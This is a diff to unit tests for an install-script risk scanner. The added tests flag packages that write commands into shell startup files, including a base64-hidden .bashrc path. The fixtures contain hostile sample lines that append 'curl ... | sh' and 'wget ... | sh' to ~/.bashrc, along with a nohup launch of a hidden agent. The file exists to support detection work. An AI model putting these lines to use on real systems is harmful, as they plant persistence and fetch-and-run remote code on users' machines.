@@ -1,7 +1,9 @@
 """Programs set to start at login or boot (0.1.8): the install-script test
 fails on a systemd unit written or enabled, a launchd agent written or
 loaded, a cron job installed, a Windows Run key written, a scheduled task
-created, the Startup folder written and an XDG autostart entry. The
+created, the Startup folder written and an XDG autostart entry; and (0.1.9)
+a command that downloads or runs code written to a shell's startup file, or
+any command written to one the script names only in strings it decodes. The
 CanisterWorm releases of @emilgroup's packages (March 2026) wrote a systemd
 user unit that runs a Python payload and enabled it from their postinstall.
 Import-time code never gets these reasons: a daemon's `install-service`
@@ -141,6 +143,59 @@ class ServiceReasonTests(unittest.TestCase):
             "fs.readdirSync(path.join(home, '.config', 'autostart'))",
         ])
 
+    def test_shell_startup_files(self):
+        # every line of a shell's startup file runs at every shell start: a command
+        # written there that downloads or runs code (B-4, MITRE ATT&CK T1546.004)
+        self.assert_reasons([
+            "const fs = require('fs'), os = require('os'), path = require('path');\n"
+            "fs.appendFileSync(path.join(os.homedir(), '.bashrc'), 'curl -s https://x.invalid/i | sh\\n');\n",
+            "const rc = { bash: '.bashrc', zsh: '.zshrc', sh: '.profile' };\n"
+            "const p = path.join(os.homedir(), rc.bash);\n"
+            "fs.writeFileSync(p, `nohup node ${__dirname}/agent.js >/dev/null 2>&1 &\\n` + old);\n",
+            "import os\nLINE = 'python3 -c \"import base64\"'\n"
+            "with open(os.path.expanduser('~/.bashrc'), 'a') as f:\n    f.write(LINE + '\\n')\n",
+            "echo 'wget -qO- https://x.invalid/i | sh' >> ~/.bashrc\n",
+        ], "adds a command to a shell's startup file (.bashrc)")
+        self.assert_reasons([
+            "import os\nopen(os.path.expanduser('~/.zshrc'), 'a').write('~/.cache/x/updater &\\n')\n",
+        ], "adds a command to a shell's startup file (.zshrc)")
+        # (.profile only as a path's last part: '.profile' alone is as often a CSS class)
+        self.assert_reasons([
+            "open(os.path.expanduser('~/.profile'), 'a').write('curl -s x.invalid/i | bash\\n')\n",
+            "printf '%s\\n' 'node ~/.x/a.js' | tee -a $HOME/.profile\n",
+        ], "adds a command to a shell's startup file (.profile)")
+        self.assert_none([
+            "console.log('Add this line to your ~/.bashrc and open a new shell');\nfs.writeFileSync('out.json', s);\n",
+            "const s = fs.readFileSync(path.join(os.homedir(), '.bashrc'), 'utf8');\n",      # read, not written
+            "document.querySelector('.profile').remove();\nfs.writeFileSync(a, b);\n",       # a CSS class
+            "const shells = ['.bashrc', '.zshrc'];\nconsole.log(shells.join(', '));\n",       # no write
+            "fs.writeFileSync(path.join(dir, 'user.profile'), data);\n",
+        ])
+        # what CLIs add, a variable, an alias or a completion, is not judged: @asyncapi/cli's
+        # postinstall appends its completion script, a command's output, to the .zshrc
+        self.assert_none([
+            "const rc = path.join(os.homedir(), '.zshrc');\n"
+            "const output = spawnSync(cli, ['autocomplete', 'script', 'zsh']).stdout;\n"
+            "fs.appendFileSync(rc, `\\n# CLI Autocomplete\\n${output}\\n`);\n",
+            "echo 'export PATH=\"$HOME/.tool/bin:$PATH\"' >> ~/.bashrc\n",
+            "echo 'eval \"$(tool init bash)\"' >> ~/.bashrc\n",
+            "import os\nwith open(os.path.expanduser('~/.bashrc'), 'a') as f:\n    f.write('alias ll=\"ls -la\"\\n')\n",
+            "printf '%s\\n' \"$LINE\" | tee -a $HOME/.profile\n",
+        ])
+
+    def test_a_startup_file_the_script_hides(self):
+        # alinet's install script names the startup files only in strings it decodes as it
+        # runs, and puts its own command, a bare name, first in the one its $SHELL reads
+        hidden = ("const fs = require('fs'), os = require('os'), path = require('path');\n"
+                  "const rc = Buffer.from('LmJhc2hyYw==', 'base64').toString();\n"
+                  "const b = path.join(os.homedir(), rc);\n"
+                  "fs.writeFileSync(b, 'alinet\\n' + fs.readFileSync(b, 'utf8'));\n")
+        self.assertEqual(core.install_script_risk(hidden),
+                         ["adds a command to a shell's startup file (.bashrc)" + _support.pack("_DV_NOTE")])
+        # written in the open, a bare name is not judged
+        self.assertEqual(core.install_script_risk(hidden.replace("Buffer.from('LmJhc2hyYw==', 'base64').toString()",
+                                                                 "'.bashrc'")), [])
+
     def test_several_at_once_in_a_fixed_order(self):
         text = ("execSync('schtasks /create /sc onlogon /tn x /tr y');\n"
                 "execSync('(crontab -l; echo \"@reboot x\") | crontab -');\n"
@@ -161,7 +216,9 @@ class ServiceReasonTests(unittest.TestCase):
         cases = ["systemctl -a" * 200_000, "| crontab " * 200_000, "CurrentVersion\\Run " * 200_000,
                  "reg " + " " * 1_000_000, "'systemd', 'user', " * 100_000 + "fs.writeFileSync(",
                  "LaunchAgents x\n" * 200_000, "schtasks " * 200_000 + "\n", "(" * 1_000_000,
-                 "\n" + " " * 1_000_000, "/etc/cron.d/x " * 100_000 + "\n"]
+                 "\n" + " " * 1_000_000, "/etc/cron.d/x " * 100_000 + "\n",
+                 "'.bashrc' " + "appendFileSync(a" * 100_000, "'.zshrc' " + "".join(f"write(n{i}) " for i in range(50_000)),
+                 "echo x >> ~/.bashrc " * 200_000, "~/.profile\n" * 200_000]
         for text in cases:
             start = time.monotonic()
             core.service_reasons(text)
